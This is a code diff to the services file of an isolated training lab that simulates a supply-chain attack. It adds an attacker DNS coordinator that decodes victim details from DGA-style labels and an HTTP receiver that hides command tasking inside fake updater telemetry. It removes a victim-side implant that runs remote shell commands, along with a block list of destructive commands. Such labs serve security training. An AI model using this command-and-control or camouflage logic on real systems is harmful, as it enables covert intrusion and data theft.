@@ -1,38 +1,35 @@
-"""Small, fixed-purpose services used by the isolated Task 5 lab."""
+"""Small, fixed-purpose services used by the isolated Task 5 lab.
+
+The DNS coordinator and the HTTP receiver belong to the simulated attacker.
+Nothing in this file beacons: the implant ships inside the signed V3 package
+and runs as its own process in the victim network namespace.
+"""
 
 from __future__ import annotations
 
-import getpass
-import hashlib
 import http.server
 import json
 import os
-import platform
 import random
 import re
 import socket
 import socketserver
 import struct
-import subprocess
 import sys
 import threading
 import time
 from pathlib import Path
 from urllib.parse import urlsplit
-from urllib.error import HTTPError
-from urllib.request import ProxyHandler, Request, build_opener
+from urllib.request import ProxyHandler, build_opener
 
 
 import config
+import dga
 
 
 DIRECT_HTTP = build_opener(ProxyHandler({}))
-DANGEROUS_PATTERNS = (
-    re.compile(r"\brm\s+-[a-zA-Z]*[rf][a-zA-Z]*\s+/(?:\s|$)"),
-    re.compile(r"\b(mkfs|shutdown|reboot|poweroff|halt)\b"),
-    re.compile(r"\bdd\b[^\n]*\bof=/dev/"),
-    re.compile(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"),
-)
+QUERY_LOG_LOCK = threading.Lock()
+MAX_QUERY_LOG_BYTES = 96 * 1024
 
 
 def append_log(path: str, message: str) -> None:
@@ -100,17 +97,18 @@ def _valid_text(value: object, maximum: int) -> bool:
 
 
 def _valid_identity(value: object) -> dict[str, str] | None:
+    """Map an Improvement Program upload onto the record the lab stores."""
     if not isinstance(value, dict):
         return None
-    victim_id = value.get("victim_id")
-    hostname = value.get("hostname")
-    username = value.get("username")
-    os_name = value.get("os")
-    ip = value.get("ip")
-    version = value.get("version")
-    process = value.get("process")
-    pid = value.get("pid")
-    arch = value.get("arch")
+    victim_id = value.get("customerId")
+    hostname = value.get("machineName")
+    username = value.get("userName")
+    os_name = value.get("osVersion")
+    ip = value.get("ipAddress")
+    version = value.get("clientVersion")
+    process = value.get("processName")
+    pid = value.get("processId")
+    arch = value.get("architecture")
     if (
         not isinstance(victim_id, str)
         or not re.fullmatch(r"v-[a-f0-9]{12}", victim_id)
@@ -134,6 +132,18 @@ def _valid_identity(value: object) -> dict[str, str] | None:
         "process": process,
         "pid": pid,
         "arch": arch,
+    }
+
+
+def _telemetry_reply(task: dict[str, object] | None) -> dict[str, object]:
+    """Answer in the shape the updater's Improvement Program endpoint uses."""
+    tasks: list[dict[str, object]] = []
+    if task is not None:
+        tasks.append({"id": task.get("task_id"), "kind": "command", "value": task.get("command")})
+    return {
+        "version": config.TELEMETRY_VERSION,
+        "status": "ok",
+        "swip": {"tasks": tasks},
     }
 
 
@@ -170,7 +180,7 @@ def serve_receiver(
 
         def do_POST(self) -> None:  # noqa: N802
             path = urlsplit(self.path).path
-            if path not in {"/checkin", "/result"}:
+            if path != config.TELEMETRY_PATH:
                 self.send_error(404)
                 return
             try:
@@ -178,43 +188,49 @@ def serve_receiver(
             except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
                 self.send_error(400)
                 return
-
-            if path == "/checkin":
-                identity = _valid_identity(value)
-                if identity is None:
-                    self.send_error(400)
-                    return
-                victim_id = identity["victim_id"]
-                now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
-                with state_lock:
-                    beacons = _read_json(beacons_file) or {}
-                    existing = beacons.get(victim_id, {})
-                    beacons[victim_id] = {
-                        **identity,
-                        "first_seen": existing.get("first_seen", now),
-                        "last_seen": now,
-                    }
-                    _write_json(beacons_file, beacons)
-                    append_log(log_path, f"POST /checkin from {identity['ip']} {identity['hostname']}")
-                    body: dict[str, object] = {"logged": True}
-                    task = _read_json(tasks)
-                    if task is not None and task.get("target") in {"all", victim_id}:
-                        delivered = task.setdefault("delivered_to", [])
-                        if isinstance(delivered, list) and victim_id not in delivered:
-                            delivered.append(victim_id)
-                            _write_json(tasks, task)
-                            body["task"] = task
-                self.send_json(200, body)
+            upload = value.get("telemetry")
+            if isinstance(upload, list):
+                self.handle_telemetry(value, upload)
                 return
 
-            task_id = value.get("task_id")
-            victim_id = value.get("victim_id")
-            command = value.get("command")
-            output = value.get("output", "")
-            exit_code = value.get("exit_code")
-            error = value.get("error")
+            identity = _valid_identity(value)
+            if identity is None:
+                self.send_error(400)
+                return
+            victim_id = identity["victim_id"]
+            now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
+            with state_lock:
+                beacons = _read_json(beacons_file) or {}
+                existing = beacons.get(victim_id, {})
+                beacons[victim_id] = {
+                    **identity,
+                    "first_seen": existing.get("first_seen", now),
+                    "last_seen": now,
+                }
+                _write_json(beacons_file, beacons)
+                append_log(log_path, f"POST {path} from {identity['ip']} {identity['hostname']}")
+                task = _read_json(tasks)
+                deliver: dict[str, object] | None = None
+                if task is not None and task.get("target") in {"all", victim_id}:
+                    delivered = task.setdefault("delivered_to", [])
+                    if isinstance(delivered, list) and victim_id not in delivered:
+                        delivered.append(victim_id)
+                        _write_json(tasks, task)
+                        deliver = task
+            self.send_json(200, _telemetry_reply(deliver))
+            return
+
+        def handle_telemetry(self, value: dict[str, object], upload: list[object]) -> None:
+            entry = next((item for item in upload if isinstance(item, dict)), None)
+            victim_id = value.get("customerId")
+            task_id = entry.get("id") if entry else None
+            command = entry.get("request") if entry else None
+            output = entry.get("result", "") if entry else ""
+            exit_code = entry.get("exitCode") if entry else None
+            error = entry.get("error") if entry else None
             if (
-                not isinstance(task_id, str)
+                entry is None
+                or not isinstance(task_id, str)
                 or not re.fullmatch(r"task-[a-f0-9]{8}", task_id)
                 or not isinstance(victim_id, str)
                 or not re.fullmatch(r"v-[a-f0-9]{12}", victim_id)
@@ -358,38 +374,103 @@ def mode_from_file(mode_path: str) -> str:
     return mode if mode in {"passive", "selected", "disabled"} else "passive"
 
 
+def _append_query(path: Path, entry: dict[str, object]) -> None:
+    with QUERY_LOG_LOCK:
+        try:
+            with path.open("a", encoding="utf-8") as handle:
+                handle.write(json.dumps(entry, sort_keys=True) + "\n")
+            if path.stat().st_size > MAX_QUERY_LOG_BYTES:
+                lines = path.read_text(encoding="utf-8", errors="replace").splitlines()[-200:]
+                path.write_text("\n".join(lines) + "\n", encoding="utf-8")
+        except OSError:
+            return
+
+
 def serve_dns(mode_path: str, log_path: str) -> None:
+    """Answer check-in questions by decoding the label, not by matching a name."""
+    queries = Path(log_path).parent / "queries.jsonl"
+
     class Handler(socketserver.BaseRequestHandler):
         def handle(self) -> None:
             packet, sock = self.request
             try:
                 transaction_id, flags, name, qtype, question = parse_question(packet)
-                mode = mode_from_file(mode_path)
-                answer_type: int | None = None
-                answer_value: str | None = None
-                rcode = 0
-                if qtype != 1:
-                    rcode = 4
-                elif name == config.CHECKIN_NAME:
-                    if mode == "disabled":
-                        rcode = 3
-                    else:
-                        answer_type = 1
-                        answer_value = config.MODE_IPS["selected" if mode == "selected" else "passive"]
-                elif name == config.HANDOFF_NAME and mode == "selected":
-                    answer_type = 5
-                    answer_value = config.RECEIVER_NAME
-                elif name == config.RECEIVER_NAME:
-                    answer_type = 1
-                    answer_value = config.RECEIVER_IP
-                else:
-                    rcode = 3
-                response = dns_response(transaction_id, flags, question, answer_type, answer_value, rcode)
-                sock.sendto(response, self.client_address)
-                record = answer_value or f"NXDOMAIN/rcode-{rcode}"
-                append_log(log_path, f"{self.client_address[0]} {name} A mode={mode} answer={record}")
             except (ValueError, UnicodeDecodeError, struct.error):
                 return
+            coordinator = mode_from_file(mode_path)
+            kind = "unknown"
+            label: str | None = None
+            decoded: dict[str, object] | None = None
+            error: str | None = None
+            answer_type: int | None = None
+            answer_value: str | None = None
+            rcode = 0
+            if qtype != 1:
+                rcode = 4
+            else:
+                label = dga.split_query(name)
+                if label is None:
+                    if name == config.HANDOFF_NAME and coordinator == "selected":
+                        kind = "handoff"
+                        answer_type = 5
+                        answer_value = config.RECEIVER_NAME
+                    elif name == config.RECEIVER_NAME:
+                        kind = "receiver"
+                        answer_type = 1
+                        answer_value = config.RECEIVER_IP
+                    else:
+                        rcode = 3
+                else:
+                    kind = "checkin"
+                    try:
+                        decoded = dga.decode_label(label)
+                    except ValueError as exc:
+                        error = str(exc)
+                        rcode = 3
+                    else:
+                        if coordinator == "disabled" or decoded["mode"] == dga.MODE_DISABLED:
+                            rcode = 3
+                        elif coordinator == "selected":
+                            answer_type = 1
+                            answer_value = config.MODE_IPS["selected"]
+                        else:
+                            answer_type = 1
+                            answer_value = config.MODE_IPS["passive"]
+            response = dns_response(transaction_id, flags, question, answer_type, answer_value, rcode)
+            sock.sendto(response, self.client_address)
+            record = answer_value or f"NXDOMAIN/rcode-{rcode}"
+            client = self.client_address[0]
+            if kind == "checkin" and decoded is not None:
+                detail = (
+                    f"qname={name} A coord={coordinator} implant={decoded['mode']}({decoded['mode_name']}) "
+                    f"answer={record} host={decoded['hostname']} user={decoded['username']} uid={decoded['uid']}"
+                )
+            elif kind == "checkin":
+                detail = f"qname={name} A coord={coordinator} implant=? answer={record} label-rejected reason={error}"
+            else:
+                detail = f"qname={name} A coord={coordinator} answer={record} {kind}"
+            append_log(log_path, f"{client} {detail}")
+            if kind == "checkin":
+                entry: dict[str, object] = {
+                    "time": time.strftime("%H:%M:%S"),
+                    "client": client,
+                    "kind": kind,
+                    "qname": name,
+                    "coordinator_mode": coordinator,
+                    "rcode": rcode,
+                    "answer": answer_value,
+                }
+                if decoded is not None:
+                    entry.update(decoded)
+                    entry["decode_ok"] = True
+                else:
+                    entry.update({
+                        "label": label,
+                        "decode_ok": False,
+                        "error": error,
+                        "looks_encoded": dga.looks_encoded(label or ""),
+                    })
+                _append_query(queries, entry)
 
     class Server(socketserver.ThreadingUDPServer):
         allow_reuse_address = True
@@ -450,177 +531,15 @@ def probe_services(updater_ip: str, dns_ip: str, receiver_ip: str) -> None:
     for address, port in ((updater_ip, config.UPDATE_PORT), (receiver_ip, config.RECEIVER_PORT)):
         with socket.create_connection((address, port), timeout=1):
             pass
-    rcode, answers = query_dns(dns_ip, config.CHECKIN_NAME)
+    probe_name = dga.build_query("probe", "probe", dga.MODE_PASSIVE)
+    rcode, answers = query_dns(dns_ip, probe_name)
     if rcode != 0 or not answers or answers[0] != (1, config.MODE_IPS["passive"]):
         raise RuntimeError("local DNS coordinator is not ready in passive mode")
     print("ready")
 
 
-def collect_identity(receiver_ip: str) -> dict[str, str]:
-    username = os.environ.get("USER") or getpass.getuser()
-    os_name = f"{platform.system()} {platform.release()}"
-    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
-        probe.connect((receiver_ip, config.RECEIVER_PORT))
-        ip = probe.getsockname()[0]
-    hostname = socket.gethostname()
-    victim_id = "v-" + hashlib.sha256(f"{hostname}|{ip}".encode("utf-8")).hexdigest()[:12]
-    return {
-        "victim_id": victim_id,
-        "hostname": hostname,
-        "username": username,
-        "os": os_name,
-        "ip": ip,
-        "process": os.path.basename(sys.executable) or "python3",
-        "pid": str(os.getpid()),
-        "arch": platform.machine(),
-    }
-
-
-def post_checkin(receiver_ip: str, identity: dict[str, str]) -> tuple[int, str]:
-    request = Request(
-        f"http://{receiver_ip}:{config.RECEIVER_PORT}/checkin",
-        data=json.dumps(identity).encode("utf-8"),
-        method="POST",
-        headers={"Content-Type": "application/json"},
-    )
-    with DIRECT_HTTP.open(request, timeout=2) as response:
-        return response.status, response.read().decode("utf-8")
-
-
-def _blocked_command(command: str) -> bool:
-    return any(pattern.search(command) for pattern in DANGEROUS_PATTERNS)
-
-
-def execute_task(task: dict[str, object], identity: dict[str, str]) -> dict[str, object]:
-    command = task.get("command")
-    task_id = task.get("task_id", "")
-    base = {
-        "task_id": task_id,
-        "victim_id": identity["victim_id"],
-        "hostname": identity["hostname"],
-        "command": command if isinstance(command, str) else str(command),
-    }
-    if not isinstance(command, str) or not command.strip() or len(command) > 1000:
-        return {**base, "exit_code": None, "output": "", "error": "invalid command"}
-    if _blocked_command(command):
-        return {**base, "exit_code": None, "output": "", "error": "command blocked by lab guardrail"}
-    try:
-        completed = subprocess.run(["/bin/sh", "-lc", command], capture_output=True, text=True, timeout=8)
-    except (OSError, subprocess.SubprocessError) as exc:
-        return {**base, "exit_code": None, "output": "", "error": str(exc)}
-    output = (completed.stdout + completed.stderr).strip()
-    return {
-        **base,
-        "exit_code": completed.returncode,
-        "output": output[:6000] if output else "(no output)",
-    }
-
-
-def post_result(receiver_ip: str, value: dict[str, object]) -> None:
-    request = Request(
-        f"http://{receiver_ip}:{config.RECEIVER_PORT}/result",
-        data=json.dumps(value).encode("utf-8"),
-        method="POST",
-        headers={"Content-Type": "application/json"},
-    )
-    with DIRECT_HTTP.open(request, timeout=2) as response:
-        response.read()
-
-
-def run_checkin(dns_ip: str, run_id: str, version: str) -> None:
-    try:
-        rcode, answers = query_dns(dns_ip, config.CHECKIN_NAME)
-    except Exception as exc:
-        print(json.dumps({
-            "mode": "error",
-            "stage": "initial DNS check-in",
-            "dns_query": f"{config.CHECKIN_NAME} A",
-            "error": str(exc),
-        }))
-        return
-    result: dict[str, object] = {
-        "dns_query": f"{config.CHECKIN_NAME} A",
-        "dns_rcode": rcode,
-        "dns_answer": answers[0][1] if answers else None,
-        "mode": "disabled" if rcode == 3 else "unknown",
-        "http_status": None,
-    }
-    if rcode == 3:
-        print(json.dumps(result))
-        return
-    mode_ip = answers[0][1] if answers else ""
-    if mode_ip == config.MODE_IPS["passive"]:
-        result["mode"] = "passive"
-        print(json.dumps(result))
-        return
-    if mode_ip != config.MODE_IPS["selected"]:
-        print(json.dumps(result))
-        return
-
-    result["mode"] = "selected"
-    result["handoff_query"] = f"{config.HANDOFF_NAME} A"
-    try:
-        handoff_rcode, handoff_answers = query_dns(dns_ip, config.HANDOFF_NAME)
-    except Exception as exc:
-        result.update({"stage": "handoff DNS lookup", "error": str(exc)})
-        print(json.dumps(result))
-        return
-    result["handoff_rcode"] = handoff_rcode
-    result["handoff_answer"] = handoff_answers[0][1] if handoff_answers else None
-    if handoff_rcode != 0 or not handoff_answers or handoff_answers[0][0] != 5:
-        detail = f"DNS response code {handoff_rcode}" if handoff_rcode != 0 else "expected a CNAME answer"
-        result.update({"stage": "handoff DNS lookup", "error": detail})
-        print(json.dumps(result))
-        return
-
-    receiver_name = handoff_answers[0][1]
-    result["receiver_query"] = f"{receiver_name} A"
-    try:
-        receiver_rcode, receiver_answers = query_dns(dns_ip, receiver_name)
-    except Exception as exc:
-        result.update({"stage": "receiver DNS lookup", "error": str(exc)})
-        print(json.dumps(result))
-        return
-    result["receiver_rcode"] = receiver_rcode
-    if receiver_rcode != 0 or not receiver_answers or receiver_answers[0][0] != 1:
-        detail = f"DNS response code {receiver_rcode}" if receiver_rcode != 0 else "expected an A answer"
-        result.update({"stage": "receiver DNS lookup", "error": detail})
-        print(json.dumps(result))
-        return
-
-    receiver_ip = receiver_answers[0][1]
-    identity = collect_identity(receiver_ip)
-    identity["version"] = version
-    result["identity"] = identity
-    result["http_request"] = "POST /checkin"
-    body = ""
-    try:
-        status, body = post_checkin(receiver_ip, identity)
-        result["http_status"] = status
-        result["http_response"] = body
-    except HTTPError as exc:
-        result["http_status"] = exc.code
-        result["http_error"] = str(exc)
-        result["http_response"] = exc.read().decode("utf-8", errors="replace")
-    except Exception as exc:  # the UI reports a blocked or unavailable local receiver
-        result["http_error"] = str(exc)
-    try:
-        reply = json.loads(body) if body else {}
-    except json.JSONDecodeError:
-        reply = {}
-    task = reply.get("task") if isinstance(reply, dict) else None
-    if isinstance(task, dict):
-        task_result = execute_task(task, identity)
-        result["task_result"] = task_result
-        try:
-            post_result(receiver_ip, task_result)
-        except Exception as exc:  # the victim keeps the result if the upload fails
-            task_result["upload_error"] = str(exc)
-    print(json.dumps(result))
-
-
 def fetch_bytes(url: str, maximum: int = 128 * 1024) -> bytes:
-    with DIRECT_HTTP.open(url, timeout=4) as response:
+    with DIRECT_HTTP.open(url, timeout=2) as response:
         body = response.read(maximum + 1)
     if len(body) > maximum:
         raise ValueError("update response exceeds the allowed size")
@@ -645,8 +564,6 @@ def main(argv: list[str]) -> None:
         serve_dns(argv[2], argv[3])
     elif role == "fetch" and len(argv) == 4:
         fetch(argv[2], argv[3])
-    elif role == "checkin" and len(argv) == 5:
-        run_checkin(argv[2], argv[3], argv[4])
     elif role == "probe" and len(argv) == 5:
         probe_services(argv[2], argv[3], argv[4])
     else:
